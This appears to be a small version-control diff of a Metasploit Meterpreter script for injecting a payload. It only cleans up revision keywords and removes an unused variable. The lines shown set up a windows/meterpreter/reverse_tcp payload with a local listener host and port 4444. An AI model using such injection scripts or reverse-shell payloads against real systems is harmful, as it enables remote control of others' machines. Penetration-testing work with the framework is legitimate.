@@ -1,5 +1,5 @@
-# $Id: meter_inject.rb 10825 2010-10-26 02:01:04Z darkoperator $
-# $Revision: 10825 $
+# $Id$
+# $Revision$
 # Author: Carlos Perez at carlos_perez[at]darkoperator.com
 #-------------------------------------------------------------------------------
 ################## Variable Declarations ##################
@@ -9,7 +9,6 @@ lhost    = Rex::Socket.source_address("1.2.3.4")
 lport    = 4444
 lhost    = "127.0.0.1"
 pid = nil
-proc_name = nil
 multi_ip = nil
 multi_pid = []
 payload_type = "windows/meterpreter/reverse_tcp"
